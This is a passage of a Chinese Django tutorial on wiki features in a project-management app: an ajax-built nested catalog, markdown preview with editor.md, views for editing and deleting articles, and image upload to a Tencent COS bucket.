class="number">3</span>,<span class="string">'title'</span>:<span class="string">'django'</span>,parent_id:<span class="number">1</span>&#125;,</span><br><span class="line">        ]</span><br><span class="line">        直接返回给前端的ajax</span><br><span class="line">        </span><br><span class="line">   - ajax回调函数success中获取 res.data，并循环</span><br><span class="line">$.each(res.data,function(index,item)&#123;</span><br><span class="line">            <span class="keyword">if</span>(item.parent_id)&#123;</span><br><span class="line">                </span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                </span><br><span class="line">            &#125;</span><br><span class="line">            </span><br><span class="line">        &#125;)</span><br><span class="line">显示</span><br><span class="line">&lt;ul&gt;</span><br><span class="line">&lt;li id=<span class="string">"1"</span>&gt;python</span><br><span class="line">        &lt;ul&gt;</span><br><span class="line">            &lt;li id="3"&gt;django&lt;/li&gt;</span><br><span class="line">        &lt;/ul&gt;</span><br><span class="line">    &lt;/li&gt;    </span><br><span class="line">    &lt;li id="2"&gt;mysql&lt;/li&gt;</span><br><span class="line">&lt;/ul&gt;</span><br></pre></td></tr></table></figure><p>多级目录展示的两个问题</p><ul><li>父目录提前出现：排序 + 字段（深度depth）</li></ul><p>该项目采用的是第二种方法，通过前端发送ajax请求</p><p><strong>目录处理构造url</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 项目管理</span></span><br><span class="line">url(<span class="string">r'^manage/(?P&lt;project_id&gt;\d+)/'</span>, include([</span><br><span class="line">    <span class="comment"># wiki路径</span></span><br><span class="line">    ...</span><br><span class="line">    <span class="comment"># 新建</span></span><br><span class="line">    ...</span><br><span class="line">    <span class="comment"># 目录处理</span></span><br><span class="line">    url(<span class="string">r'^wiki/catalog/$'</span>, wiki.wiki_catalog, name=<span class="string">'wiki_catalog'</span>),</span><br><span class="line">], <span class="literal">None</span>, <span class="literal">None</span>)),</span><br></pre></td></tr></table></figure><p><strong>发送ajax请求</strong></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="actionscript">    <span class="keyword">var</span> WIKI_DETAIL_URL = <span class="string">"&#123;% url 'wiki' project_id=request.tracer.project.id%&#125;"</span>;</span></span><br><span class="line"><span class="javascript">$(<span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span></span><br><span class="line">            initCatalog();</span><br><span class="line">...</span><br><span class="line">        &#125;);</span><br><span class="line"></span><br><span class="line"><span class="actionscript">        <span class="function"><span class="keyword">function</span> <span class="title">initCatalog</span><span class="params">()</span> </span>&#123;</span></span><br><span class="line"><span class="javascript">            $.ajax(&#123;</span></span><br><span class="line"><span class="actionscript">                url: <span class="string">'&#123;% url '</span>wiki_catalog<span class="string">' project_id=request.tracer.project.id%&#125;'</span>,</span></span><br><span class="line"><span class="actionscript">                type: <span class="string">"GET"</span>,</span></span><br><span class="line"><span class="actionscript">                dataType: <span class="string">"JSON"</span>,</span></span><br><span class="line"><span class="actionscript">                success: <span class="function"><span class="keyword">function</span> <span class="params">(res)</span> </span>&#123;</span></span><br><span class="line">                    if (res.status) &#123;</span><br><span class="line"><span class="javascript">                        $.each(res.data, <span class="function"><span class="keyword">function</span> (<span class="params">index, item</span>) </span>&#123;</span></span><br><span class="line"><span class="actionscript">                            <span class="comment">// item=[1, "python", null]、[2, "myslq", null]</span></span></span><br><span class="line"><span class="actionscript">                            <span class="comment">// item=&#123;id:1, title:"python", parent_id:null&#125;</span></span></span><br><span class="line"><span class="actionscript">                            <span class="comment">// url地址构造：/manage/6/wiki/?wiki_id=1</span></span></span><br><span class="line"><span class="actionscript">                            <span class="keyword">var</span> href = WIKI_DETAIL_URL + <span class="string">"?wiki_id="</span> + item.id;</span></span><br><span class="line"><span class="handlebars"><span class="xml">                            // 构造标签 : <span class="tag">&lt;<span class="name">li</span> <span class="attr">id</span>=<span class="string">"id_1"</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"/manage/6/wiki/?wiki_id=1"</span>&gt;</span>目录1<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;<span class="name">ul</span>&gt;</span><span class="tag">&lt;/<span class="name">ul</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span></span></span><br><span class="line"><span class="javascript">                            <span class="keyword">var</span> li = $(<span class="string">"&lt;li&gt;"</span>).attr(<span class="string">'id'</span>, <span class="string">'id_'</span> + item.id).append($(<span class="string">"&lt;a&gt;"</span>).text(item.title).attr(<span class="string">'href'</span>, href)).append($(<span class="string">'&lt;ul&gt;'</span>));</span></span><br><span class="line">                            if (!item.parent_id) &#123;</span><br><span class="line"><span class="handlebars"><span class="xml">                                // <span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"#"</span>&gt;</span>目录1<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span></span></span><br><span class="line"><span class="actionscript">                                <span class="comment">// 添加到catalog中</span></span></span><br><span class="line"><span class="javascript">                                $(<span class="string">'#catalog'</span>).append(li)</span></span><br><span class="line"><span class="actionscript">                            &#125; <span class="keyword">else</span> &#123;</span></span><br><span class="line"><span class="javascript">                                $(<span class="string">"#id_"</span> + item.parent_id).children(<span class="string">'ul'</span>).append(li);</span></span><br><span class="line">                            &#125;</span><br><span class="line">                        &#125;)</span><br><span class="line"><span class="actionscript">                    &#125; <span class="keyword">else</span> &#123;</span></span><br><span class="line"><span class="actionscript">                        alert(<span class="string">"初始化目录失败"</span>)</span></span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;)</span><br><span class="line">        &#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p><strong>后端处理，放回给前端，并通过ajax的success回调函数处理与显示</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">wiki_catalog</span><span class="params">(request, project_id)</span>:</span></span><br><span class="line">    <span class="string">"""wiki目录"""</span></span><br><span class="line">    <span class="comment"># 获取当前项目的所有目录: data = QuerySet类型</span></span><br><span class="line">    <span class="comment"># data = models.Wiki.objects.filter(project=request.tracer.project).values_list('id','title','parent_id')</span></span><br><span class="line">    <span class="comment"># values_list的时候data的数据为：item=[1, "python", null]、[2, "myslq", null]</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># data = models.Wiki.objects.filter(project=request.tracer.project).values('id','title','parent_id')</span></span><br><span class="line">    <span class="comment"># values的时候data的数据为：item=&#123;id:1, title:"python", parent_id:null&#125;</span></span><br><span class="line"></span><br><span class="line">    data = models.Wiki.objects.filter(project=request.tracer.project).values(<span class="string">'id'</span>, <span class="string">'title'</span>, <span class="string">'parent_id'</span>).order_by(</span><br><span class="line">        <span class="string">'depth'</span>, <span class="string">'id'</span>)</span><br><span class="line">    <span class="comment"># json.dumps只能序列化字典、列表等类型</span></span><br><span class="line">    <span class="comment"># json.dumps(QuerySet类型) 所以出错</span></span><br><span class="line">    <span class="comment"># 所以应该将data转为列表类型</span></span><br><span class="line">    <span class="keyword">return</span> JsonResponse(&#123;<span class="string">'status'</span>: <span class="literal">True</span>, <span class="string">'data'</span>: list(data)&#125;)</span><br></pre></td></tr></table></figure><h3 id="10-6-点击目录，显示文章内容"><a href="#10-6-点击目录，显示文章内容" class="headerlink" title="10.6 点击目录，显示文章内容"></a>10.6 点击目录，显示文章内容</h3><p>目录显示，构造对应的a标签 ，每篇文章的内容（url地址构造：/manage/6/wiki/?wiki_id=1）</p><ul><li>wiki首页对内容进行判断，如果是点击谋篇文章则显示，文章内容否则显示新建文章。</li></ul><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"> &#123;% if wiki_obj %&#125;</span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">"previewMarkdown"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">textarea</span>&gt;</span>&#123;&#123; wiki_obj.content &#125;&#125;<span class="tag">&lt;/<span class="name">textarea</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">&#123;% else %&#125;</span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">style</span>=<span class="string">"text-align: center ;margin-top: 80px"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">h4</span>&gt;</span>《&#123;&#123; request.tracer.project.name &#125;&#125;》wiki文档<span class="tag">&lt;/<span class="name">h4</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"&#123;% url 'wiki_add' project_id=request.tracer.project.id %&#125;"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">i</span> <span class="attr">class</span>=<span class="string">"fa fa-plus-circle"</span> <span class="attr">aria-hidden</span>=<span class="string">"true"</span>&gt;</span><span class="tag">&lt;/<span class="name">i</span>&gt;</span></span><br><span class="line">        新建文档</span><br><span class="line">    <span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">&#123;% endif %&#125;</span><br></pre></td></tr></table></figure><ul><li><p>后台会进行处理，判断是否选择了某篇文章（参考Wiki首页展示的视图函数代码）</p></li><li><p>以markdown形式显示文章的内容</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">1. textarea框通过div包裹以便以后查找并转换为编辑器</span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">"previewMarkdown"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">textarea</span>&gt;</span>&#123;&#123; wiki_obj.content &#125;&#125;<span class="tag">&lt;/<span class="name">textarea</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line">2. 引入js和css</span><br><span class="line"><span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">"stylesheet"</span> <span class="attr">href</span>=<span class="string">"&#123;% static 'plugin/editor-md/css/editormd.preview.min.css' %&#125;"</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"&#123;% static 'plugin/editor-md/editormd.min.js' %&#125;"</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"&#123;% static 'plugin/editor-md/lib/marked.min.js' %&#125;"</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"&#123;% static 'plugin/editor-md/lib/flowchart.min.js' %&#125;"</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"&#123;% static 'plugin/editor-md/lib/jquery.flowchart.min.js' %&#125;"</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"&#123;% static 'plugin/editor-md/lib/prettify.min.js' %&#125;"</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"&#123;% static 'plugin/editor-md/lib/raphael.min.js' %&#125;"</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"&#123;% static 'plugin/editor-md/lib/sequence-diagram.min.js' %&#125;"</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"&#123;% static 'plugin/editor-md/lib/underscore.min.js' %&#125;"</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"> </span><br><span class="line">3. 初始化</span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript"> $(<span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span></span><br><span class="line">     initPreivewMarkdown();</span><br><span class="line">     &#125;);</span><br><span class="line"><span class="actionscript">     <span class="function"><span class="keyword">function</span> <span class="title">initPreivewMarkdown</span><span class="params">()</span> </span>&#123;</span></span><br><span class="line"><span class="actionscript">     editormd.markdownToHTML(<span class="string">'previewMarkdown'</span>,&#123;</span></span><br><span class="line"><span class="actionscript">     htmlDecode:<span class="string">"style,script,iframe"</span> <span class="comment">// 过滤，script防止xss攻击，style引用其他文件，iframe防止嵌套别的页面</span></span></span><br><span class="line">     &#125;);</span><br><span class="line">     &#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure></li></ul><h3 id="10-7-编辑文章"><a href="#10-7-编辑文章" class="headerlink" title="10.7 编辑文章"></a>10.7 编辑文章</h3><h4 id="10-7-1-构造编辑文章的url路径"><a href="#10-7-1-构造编辑文章的url路径" class="headerlink" title="10.7.1 构造编辑文章的url路径"></a>10.7.1 构造编辑文章的url路径</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 项目管理</span></span><br><span class="line">url(<span class="string">r'^manage/(?P&lt;project_id&gt;\d+)/'</span>, include([</span><br><span class="line">    <span class="comment"># wiki路径</span></span><br><span class="line">    ...</span><br><span class="line">    <span class="comment"># 新建</span></span><br><span class="line">    ...</span><br><span class="line">    <span class="comment"># 目录处理</span></span><br><span class="line">    ...</span><br><span class="line">    <span class="comment"># 编辑文章</span></span><br><span class="line">    url(<span class="string">r'^wiki/edit/(?P&lt;wiki_id&gt;\d+)$'</span>, wiki.wiki_edit, name=<span class="string">'wiki_edit'</span>),</span><br><span class="line">], <span class="literal">None</span>, <span class="literal">None</span>)),</span><br></pre></td></tr></table></figure><h4 id="10-7-2-编辑文章视图函数"><a href="#10-7-2-编辑文章视图函数" class="headerlink" title="10.7.2 编辑文章视图函数"></a>10.7.2 编辑文章视图函数</h4><p>由于编辑文章和添加文章的html页面显示几乎一致所有采用同一个html模板，由前端判断显示内容。</p><p>编辑文章的视图函数</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">wiki_edit</span><span class="params">(request, project_id, wiki_id)</span>:</span></span><br><span class="line">    <span class="string">"""编辑文章"""</span></span><br><span class="line">    wiki_obj = models.Wiki.objects.filter(project_id=project_id, id=wiki_id).first()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> wiki_obj:</span><br><span class="line">        url = reverse(<span class="string">'wiki'</span>, kwargs=&#123;<span class="string">'project_id'</span>: project_id&#125;)</span><br><span class="line">        <span class="keyword">return</span> redirect(url)</span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">"GET"</span>:</span><br><span class="line">        form = WikiModelForm(request, instance=wiki_obj)</span><br><span class="line">        <span class="keyword">return</span> render(request, <span class="string">'manage/wiki_form.html'</span>, &#123;<span class="string">'form'</span>: form&#125;)</span><br><span class="line">    form = WikiModelForm(request, data=request.POST, instance=wiki_obj)</span><br><span class="line">    <span class="keyword">if</span> form.is_valid():</span><br><span class="line">        <span class="comment"># 判断深度，是否选择父文章</span></span><br><span class="line">        <span class="keyword">if</span> form.instance.parent:</span><br><span class="line">            form.instance.depth = form.instance.parent.depth + <span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            form.instance.depth = <span class="number">1</span></span><br><span class="line">        form.save()</span><br><span class="line">        url = reverse(<span class="string">'wiki'</span>, kwargs=&#123;<span class="string">'project_id'</span>: project_id&#125;)</span><br><span class="line">        preview_url = <span class="string">"&#123;0&#125;?wiki_id=&#123;1&#125;"</span>.format(url, wiki_id)</span><br><span class="line">        <span class="keyword">return</span> redirect(preview_url)</span><br><span class="line">    <span class="keyword">return</span> render(request, <span class="string">'manage/wiki_form.html'</span>, &#123;<span class="string">'form'</span>: form&#125;)</span><br></pre></td></tr></table></figure><h3 id="10-8-删除文章"><a href="#10-8-删除文章" class="headerlink" title="10.8 删除文章"></a>10.8 删除文章</h3><h4 id="10-8-1-构造删除文章的url路径"><a href="#10-8-1-构造删除文章的url路径" class="headerlink" title="10.8.1 构造删除文章的url路径"></a>10.8.1 构造删除文章的url路径</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 项目管理</span></span><br><span class="line">url(<span class="string">r'^manage/(?P&lt;project_id&gt;\d+)/'</span>, include([</span><br><span class="line">    <span class="comment"># wiki路径</span></span><br><span class="line">    ...</span><br><span class="line">    <span class="comment"># 新建</span></span><br><span class="line">    ...</span><br><span class="line">    <span class="comment"># 目录处理</span></span><br><span class="line">    ...</span><br><span class="line">    <span class="comment"># 编辑文章</span></span><br><span class="line">    ...</span><br><span class="line">    <span class="comment"># 删除文章</span></span><br><span class="line">    url(<span class="string">r'^wiki/delete/(?P&lt;wiki_id&gt;\d+)$'</span>, wiki.wiki_delete, name=<span class="string">'wiki_delete'</span>),</span><br><span class="line">], <span class="literal">None</span>, <span class="literal">None</span>)),</span><br></pre></td></tr></table></figure><h4 id="10-7-2-删除文章视图函数"><a href="#10-7-2-删除文章视图函数" class="headerlink" title="10.7.2 删除文章视图函数"></a>10.7.2 删除文章视图函数</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">wiki_delete</span><span class="params">(request, project_id, wiki_id)</span>:</span></span><br><span class="line">    <span class="string">"""删除文章"""</span></span><br><span class="line">    models.Wiki.objects.filter(project_id=project_id, id=wiki_id).delete()</span><br><span class="line"></span><br><span class="line">    url = reverse(<span class="string">'wiki'</span>, kwargs=&#123;<span class="string">'project_id'</span>: project_id&#125;)</span><br><span class="line">    <span class="keyword">return</span> redirect(url)</span><br></pre></td></tr></table></figure><h3 id="10-9-上传图片"><a href="#10-9-上传图片" class="headerlink" title="10.9 上传图片"></a>10.9 上传图片</h3><p>上传图片采用的是腾讯的cos上传（参考腾讯cos上传文件）</p><p>项目创建的时候就位该项目创建了桶，上传图片，就上传到该桶中。</p><h4 id="10-9-1修改markdown初始化代码"><a href="#10-9-1修改markdown初始化代码" class="headerlink" title="10.9.1修改markdown初始化代码"></a>10.9.1修改markdown初始化代码</h4><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"> <span class="comment">/*</span></span><br><span class="line"><span class="comment">初始化markdown编辑器(textare转为编辑器）</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">initEditorMd</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    editormd(<span class="string">'editor'</span>,&#123;</span><br><span class="line">        placeholder:<span class="string">"请输入内容"</span>,</span><br><span class="line">        height:<span class="number">500</span>,</span><br><span class="line">        path: <span class="string">"&#123;% static 'plugin/editor-md/lib/' %&#125;"</span>,</span><br><span class="line">        <span class="comment">// 上传图片的相关配置</span></span><br><span class="line">        imageUpload:<span class="literal">true</span>,</span><br><span class="line">        imageFormats:[<span class="string">"jpg"</span>,<span class="string">"jpeg"</span>,<span class="string">"png"</span>,<span class="string">"gif"</span>],</span><br><span class="line">        imageUploadURL:WIKI_UPLOAD_URL,</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="10-9-2-构造url上传图片的地址"><a href="#10-9-2-构造url上传图片的地址" class="headerlink" title="10.9.2 构造url上传图片的地址"></a>10.9.2 构造url上传图片的地址</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 项目管理</span></span><br><span class="line">url(<span class="string">r'^manage/(?P&lt;project_id&gt;\d+)/'</span>, include([</span><br><span class="line">    <span class="comment"># wiki路径</span></span><br><span class="line">    ...</span><br><span class="line">    <span class="comment"># 新建</span></span><br><span class="line">    ...</span><br><span class="line">    <span class="comment"># 目录处理</span></span><br><span class="line">    ...</span><br><span class="line">    <span class="comment"># 编辑文章</span></span><br><span class="line">    ...</span><br><span class="line">    <span class="comment"># 删除文章</span></span><br><span class="line">    ...</span><br><span class="line">    <span class="comment"># 上传图片</span></span><br><span class="line">    url(<span class="string">r'^wiki/upload/$'</span>, wiki.wiki_upload, name=<span class="string">'wiki_upload'</span>),</span><br><span class="line">], <span class="literal">None</span>, <span class="literal">None</span>)),</span><br></pre></td></tr></table></figure><h4 id="10-9-3-在cos-py文件中书写上传文件到桶的相关代码"><a href="#10-9-3-在cos-py文件中书写上传文件到桶的相关代码" class="headerlink" title="10.9.3 在cos.py文件中书写上传文件到桶的相关代码"></a>10.9.3 在cos.py文件中书写上传文件到桶的相关代码</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">upload_bucket</span><span class="params">(bucket, region, file_object, key)</span>:</span></span><br><span class="line">    <span class="comment"># 将文件对象上传到当前项目的桶中</span></span><br><span class="line">    config = CosConfig(Region=region, SecretId=settings.TENCENT_COS_ID, SecretKey=settings.TENCENT_COS_KEY)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 2. 获取客户端对象</span></span><br><span class="line">    client = CosS3Client(config)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 上传文件</span></span><br><span class="line">    response = client.upload_file_from_buffer(</span><br><span class="line">        Bucket=bucket,  <span class="comment"># 要上传桶的名称</span></span><br><span class="line">        Body=file_object,  <span class="comment"># 本地文件对象</span></span><br><span class="line">        Key=key,  <span class="comment"># 上传到桶之后的文件名</span></span><br><span class="line">    )</span><br><span class="line">    <span class="keyword">return</span> <span class="string">"https://&#123;&#125;.cos.&#123;&#125;.myqcloud.com/&#123;&#125;"</span>.format(bucket, region, key)</span><br></pre></td></tr></table></figure><h4 id="10-9-4-wiki视图函数书写markdown上传图片到桶的相关函数"><a href="#10-9-4-wiki视图函数书写markdown上传图片到桶的相关函数" class="headerlink" title="10.9.4 wiki视图函数书写markdown上传图片到桶的相关函数"></a>10.9.4 wiki视图函数书写markdown上传图片到桶的相关函数</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> django.views.decorators.csrf <span class="keyword">import</span> csrf_exempt</span><br><span class="line"><span class="meta">@csrf_exempt # 忽略csrf验证</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">wiki_upload</span><span class="params">(request, project_id)</span>:</span></span><br><span class="line">    <span class="string">"""markdown插件上传图片"""</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># markdown插件是否删除成功的标志是success=1</span></span><br><span class="line">    result = &#123;</span><br><span class="line">        <span class="string">'success'</span>: <span class="number">0</span>,</span><br><span class="line">        <span class="string">'message'</span>: <span class="literal">None</span>,</span><br><span class="line">        <span class="string">'url'</span>: <span class="literal">None</span>,</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    print(<span class="string">'接收到图片'</span>)</span><br><span class="line">    img_obj = request.FILES.get(<span class="string">'editormd-image-file'</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> img_obj:</span><br><span class="line">        result[<span class="string">'message'</span>]=<span class="string">"文件不存在"</span></span><br><span class="line">        <span class="keyword">return</span> JsonResponse(result)</span><br><span class="line">    ext = img_obj.name.rsplit(<span class="string">'.'</span>)[<span class="number">-1</span>] <span class="comment"># 切割文件名获取文件后缀</span></span><br><span class="line">    key = <span class="string">'&#123;&#125;.&#123;&#125;'</span>.format(uid(request.tracer.user.mobile_phone),ext)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 将文件上传到桶,获得文件的上传地址</span></span><br><span class="line">    img_url = cos.upload_bucket(</span><br><span class="line">        request.tracer.project.bucket,</span><br><span class="line">        request.tracer.project.region,</span><br><span class="line">        img_obj,</span><br><span class="line">        key</span><br><span class="line">    )</span><br><span class="line"></span><br><span class="line">    result[<span class="string">'success'</span>]=<span class="number">1</span></span><br><span class="line">    result[<span class="string">'url'</span>]=img_url</span><br><span class="line"></span><br><span 